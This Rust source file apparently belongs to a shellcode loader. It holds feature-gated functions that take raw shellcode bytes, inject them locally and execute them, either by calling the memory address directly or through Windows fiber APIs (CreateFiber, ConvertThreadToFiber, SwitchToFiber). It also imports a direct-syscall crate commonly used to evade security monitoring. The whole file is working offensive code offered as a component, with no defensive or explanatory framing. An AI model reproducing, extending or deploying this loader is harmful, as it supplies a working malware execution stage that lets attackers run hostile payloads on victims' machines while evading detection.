use std::ffi::c_void;
use rust_syscalls::syscall;

#[cfg(feature = "InjectionDefaultLocal")]
use super::injection::inject_default_local;

// =======================================================================================================
// EXECUTION METHOD: DEFAULT
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteDefault")]
pub fn shellcode_execute_default(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                unsafe {
                    let function: extern "C" fn() = std::mem::transmute(base_address);
                    (function)();
                }
                true
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}

// =======================================================================================================
// EXECUTION METHOD: FIBER
// =======================================================================================================

#[cfg(feature = "ShellcodeExecuteFiber")]
use windows::Win32::System::Threading::{
    ConvertThreadToFiber, CreateFiber, DeleteFiber, SwitchToFiber,
    LPFIBER_START_ROUTINE,
};

#[cfg(feature = "ShellcodeExecuteFiber")]
struct Fiber {
    shellcode_fiber_address: *mut c_void,
    primary_fiber_address: *mut c_void,
}

#[cfg(feature = "ShellcodeExecuteFiber")]
impl Drop for Fiber {
    fn drop(&mut self) {
        unsafe {
            if !self.shellcode_fiber_address.is_null() {
                DeleteFiber(self.shellcode_fiber_address);
            }
            if !self.primary_fiber_address.is_null() {
                DeleteFiber(self.primary_fiber_address);
            }
        }
    }
}

#[cfg(feature = "ShellcodeExecuteFiber")]
pub fn shellcode_execute_fiber(bytes_to_load: Vec<u8>) -> bool {
    #[cfg(feature = "InjectionDefaultLocal")]
    {
        match inject_default_local(&bytes_to_load) {
            Ok(base_address) => {
                unsafe {
                    let mut fiber: Fiber = std::mem::zeroed();
                    
                    // Create fiber from shellcode address
                    fiber.shellcode_fiber_address = CreateFiber(
                        0, 
                        std::mem::transmute::<*mut c_void, LPFIBER_START_ROUTINE>(base_address), 
                        None
                    );
                    if fiber.shellcode_fiber_address.is_null() {
                        return false;
                    }
                    
                    // Convert current thread to fiber
                    fiber.primary_fiber_address = ConvertThreadToFiber(None);
                    if fiber.primary_fiber_address.is_null() {
                        return false;
                    }

                    // Switch execution to shellcode fiber
                    SwitchToFiber(fiber.shellcode_fiber_address);
                }
                true
            }
            Err(_) => false,
        }
    }
    
    #[cfg(not(feature = "InjectionDefaultLocal"))]
    {
        false
    }
}
